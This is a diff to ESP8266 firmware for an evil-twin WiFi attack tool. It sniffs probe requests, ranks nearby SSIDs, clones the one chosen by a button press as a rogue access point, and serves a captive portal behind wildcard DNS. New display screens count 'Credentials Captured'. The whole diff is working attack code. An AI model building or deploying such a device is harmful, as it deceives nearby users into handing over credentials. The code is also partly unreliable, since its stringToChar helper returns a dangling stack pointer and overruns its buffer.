@@ -6,6 +6,7 @@ extern "C" {
 #include "SSD1306.h" // alias for `#include "SSD1306Wire.h"`
 #include <DNSServer.h>
 #include <ESP8266WebServer.h>
+#include <ClickButton.h>
 
 SSD1306  display(0x3c, D5, D6);
 
@@ -17,8 +18,9 @@ SSD1306  display(0x3c, D5, D6);
 #define SUBTYPE_PROBE_REQUEST 0x04
 #define SUBTYPE_BEACON        0x08
 
-#define DEMO_DURATION 10000
-typedef void (*Demo)(void);
+#define STATE0_DURATION 10000
+#define STATE2_DURATION  5000
+typedef void (*Screen)(void);
 
 struct RxControl {
  signed rssi:8; // signal intensity of packet
@@ -65,16 +67,21 @@ struct SSID SSIDlist[20];
 
 int SSIDcount = 0;
 
+const int LEDpin = D0;
+
 int numberOfInterrupts = 0;
 volatile byte interruptCounter = 0;
 const int interruptPin = D1;
+ClickButton button2(interruptPin, LOW, CLICKBTN_PULLUP);
 
 int numberOfInterrupts2 = 0;
 volatile byte interrupt2Counter = 0;
 const int interrupt2Pin = D2;
+ClickButton button1(interrupt2Pin, LOW, CLICKBTN_PULLUP);
 
-int demoMode = 0;
+int screenState = 0;
 int counter = 1;
+long timeOfLastModeSwitch = 0;
 
 const byte DNS_PORT = 53;  //THESE WERE BREAKING IT ???
 IPAddress apIP(192, 168, 1, 1);
@@ -162,6 +169,10 @@ static void showMetadata(SnifferPacket *snifferPacket) {
   printf("%d, ", match);
   printf("%d\n", SSIDcount);
 
+  // LED blink on probe request
+  digitalWrite(LEDpin, LOW);
+
+
 }
 
 /**
@@ -206,7 +217,8 @@ static String getMAC(char *addr, uint8_t* data, uint16_t offset) {
     }
 }*/
 
-static char* stringToChar(String s, int buffer){
+static char* stringToChar(String s){
+    int buffer = s.length();
     char array[buffer];
     for(int i = 0; i <= buffer; i++){
         array[i] = s[i];
@@ -214,46 +226,88 @@ static char* stringToChar(String s, int buffer){
     return array;
 }
 
-String scan = "Scanning";
+String scan = "Scanning.";
 static void ICACHE_FLASH_ATTR displayScanning() {
-  int progress = (counter / 2) % 100;
+  int progress = (counter) % 100;
     // draw the progress bar
   display.drawProgressBar(0, 32, 120, 10, progress);
 
   // draw the percentage as String
   display.setTextAlignment(TEXT_ALIGN_CENTER);
-  display.drawString(64, 15, String(progress) + "%");
+  //display.drawString(64, 15, String(progress) + "%");
 
   display.setTextAlignment(TEXT_ALIGN_LEFT);
 
-  if (progress%10){
-    scan += ".";
+  if (progress%10 == 0){
+    if(progress%30 == 0){
+      scan.remove(9, 2);
+    }else{
+      scan += ".";
+    }
   }
-  display.drawString(0, 0, scan);
+  display.drawString(41, 5, scan);
 }
 
 static void ICACHE_FLASH_ATTR displaySSIDs() {
   display.setTextAlignment(TEXT_ALIGN_LEFT);
   display.drawString(0, 0, "SSID");
   display.drawString(90, 0, "uniques");
-  for ( int i = 1 ; i <= SSIDcount ; i++){
-      display.drawRect(0, (numberOfInterrupts2+1)*10, 70, 12);
 
-      display.drawString(0, i*10, SSIDlist[i].name);
-      display.drawString(90, i*10, String(SSIDlist[i].uniques));
+  if (numberOfInterrupts2 <= 4){
+    for ( int i = 1 ; i <= 5 ; i++){
+        display.drawRect(0, (numberOfInterrupts2+1)*10, 80, 12);
+
+        display.drawString(0, i*10, SSIDlist[i].name);
+        display.drawString(90, i*10, String(SSIDlist[i].uniques));
+    }
+  }else{
+    for ( int i = 1 ; i <= 5 ; i++){
+        display.drawRect(0, 50, 80, 12);
+
+        display.drawString(0, i*10, SSIDlist[i+numberOfInterrupts2-4].name);
+        display.drawString(90, i*10, String(SSIDlist[i+numberOfInterrupts2-4].uniques));
+    }
   }
+}
+
+//int prog2 = 0;
+static void ICACHE_FLASH_ATTR displayAPsetup() {
+  // draw the progress bar
+  //display.drawProgressBar(0, 32, 120, 10, progress);
+  int progress = (counter*5) % 100;
+  // draw the percentage as String
+  display.setTextAlignment(TEXT_ALIGN_CENTER);
+  //display.drawString(64, 15, String(progress) + "%");
+
+  display.drawString(64, 15, "Setting up");
+  display.drawString(64, 30, SSIDlist[numberOfInterrupts2+1].name + " Access Point");
+  if (millis() - timeOfLastModeSwitch < 2700){
+      display.drawProgressBar(32, 48, 60, 12, progress);
+  }else{
+      display.drawString(64, 46, "Ready");
+  }
+}
+
+static void ICACHE_FLASH_ATTR displayKEYcapture(){
+  display.setTextAlignment(TEXT_ALIGN_CENTER);
+  //display.drawString(64, 15, String(progress) + "%");
+  display.drawString(64, 0, "Captive portal on");
+  display.drawString(64, 15, SSIDlist[numberOfInterrupts2+1].name + " Access Point");
+  display.drawString(64, 30, "Credentials Captured:");
+  display.drawString(64, 45, String(WiFi.softAPgetStationNum()));
 }
 
 static void captivePortal(){
 
-  //yield();
+
   wifi_set_opmode(WIFI_AP);
   delay(10);
   WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
   //WiFi.softAP("ESP-D1mini");
   delay(10);
-  char *ap = stringToChar(SSIDlist[numberOfInterrupts2+1].name, 32);
-  WiFi.softAP(ap);
+  char *ap = stringToChar(SSIDlist[numberOfInterrupts2+1].name);
+  //WiFi.softAP(ap);
+  Serial.println(WiFi.softAP(ap) ? "Ready" : "Failed!");
   delay(10);
   // if DNSServer is started with "*" for domain name, it will reply with
   // provided IP to all DNS request
@@ -267,13 +321,13 @@ static void captivePortal(){
 
 }
 
-static void ICACHE_FLASH_ATTR handleInterrupt() {
+/*static void ICACHE_FLASH_ATTR handleInterrupt() {
   interruptCounter++;
-}
+}*/
 
-static void ICACHE_FLASH_ATTR handleInterrupt2() {
+/*static void ICACHE_FLASH_ATTR handleInterrupt2() {
   interrupt2Counter++;
-}
+}*/
 
 #define CHANNEL_HOP_INTERVAL_MS   1000
 static os_timer_t channelHop_timer;
@@ -293,18 +347,21 @@ void channelHop()
 #define DISABLE 0
 #define ENABLE  1
 
-Demo demos[] = { displayScanning, displaySSIDs};
-int demoLength = (sizeof(demos) / sizeof(Demo));
-long timeSinceLastModeSwitch = 0;
+Screen screens[] = { displayScanning, displaySSIDs, displayAPsetup, displayKEYcapture};
+int demoLength = (sizeof(screens) / sizeof(Screen));
 
 void setup() {
 
     //Start serial connection
     Serial.begin(115200);
+    pinMode(LEDpin, OUTPUT);
+    digitalWrite(LEDpin, HIGH);
+    // setup interrupt pins
     pinMode(interruptPin, INPUT_PULLUP);
-    attachInterrupt(interruptPin, handleInterrupt, FALLING);
+    //ClickButton button1(interruptPin, LOW, CLICKBTN_PULLUP);
+    //attachInterrupt(interruptPin, handleInterrupt, FALLING);
     pinMode(interrupt2Pin, INPUT_PULLUP);
-    attachInterrupt(interrupt2Pin, handleInterrupt2, FALLING);
+    //attachInterrupt(interrupt2Pin, handleInterrupt2, FALLING);
 
     // set the WiFi chip to "promiscuous" mode aka monitor mode
     delay(10);
@@ -329,28 +386,42 @@ void setup() {
 
 void loop() {
 
+  button1.Update();
+  button2.Update();
+
+  //if (button1.clicks != 0) function = button1.clicks;
   // clear the display
   display.clear();
-  // draw the current demo method
-  demos[demoMode]();
+  // draw the current Screen method
+  screens[screenState]();
 
   display.setTextAlignment(TEXT_ALIGN_RIGHT);
   display.drawString(10, 128, String(millis()));
   // write the buffer to the display
   display.display();
 
-  if ((millis() - timeSinceLastModeSwitch > DEMO_DURATION)) {
+  if ((millis() - timeOfLastModeSwitch > STATE0_DURATION) && numberOfInterrupts == 0) {
 
-    demoMode = 1;
-    //timeSinceLastModeSwitch = millis();
+    screenState = 1;
+    timeOfLastModeSwitch = millis();
   }
 
-  if(interruptCounter > 0){
+  if(button1.clicks == 1){
+    Serial.println("button clicked");
+    //interrupt2Counter--;
+    numberOfInterrupts2++;
+  }
 
-      interruptCounter--;
+  if(numberOfInterrupts2 > 9){
+    numberOfInterrupts2 = 0;
+  }
+
+  if(button2.clicks == 1){
+
+      //interruptCounter--;
       numberOfInterrupts++;
-      detachInterrupt(interruptPin);
-      detachInterrupt(interrupt2Pin);
+      //detachInterrupt(interruptPin);
+      //detachInterrupt(interrupt2Pin);
 
       Serial.print("An interrupt has occurred. Total: ");
       Serial.println(numberOfInterrupts);
@@ -361,6 +432,12 @@ void loop() {
 
       delay(10);
       //wifi_set_opmode(WIFI_AP);
+      screenState = 2;
+      timeOfLastModeSwitch = millis();
+      counter = 0;
+
+      delay(10);
+
       captivePortal();
 
       /*for ( int i = 1 ; i <= SSIDcount ; i++){
@@ -375,31 +452,29 @@ void loop() {
       /*char *ap = stringToChar(SSIDlist[numberOfInterrupts2+1].name, 32);
       Serial.println(WiFi.softAP(ap) ? "Ready" : "Failed!");*/
 
-      delay(10);
-
-
+      //delay(10);
 
   }
 
-  if(interrupt2Counter > 0){
-    interrupt2Counter--;
-    numberOfInterrupts2++;
+  if ((millis() - timeOfLastModeSwitch > STATE2_DURATION) && numberOfInterrupts > 0) {
+
+    screenState = 3;
+    timeOfLastModeSwitch = millis();
+
   }
 
   if(numberOfInterrupts > 0){
 
-      Serial.printf("Stations connected = %d\n", WiFi.softAPgetStationNum());
+      //Serial.printf("Stations connected = %d\n", WiFi.softAPgetStationNum());
       delay(10);
       dnsServer.processNextRequest();
       delay(10);
       webServer.handleClient();
       //delay(3000);
   }
-  if(numberOfInterrupts2 > 4){
-    numberOfInterrupts2 = 0;
-  }
 
   counter++;
   delay(100);
+  digitalWrite(LEDpin, HIGH);
 
 }
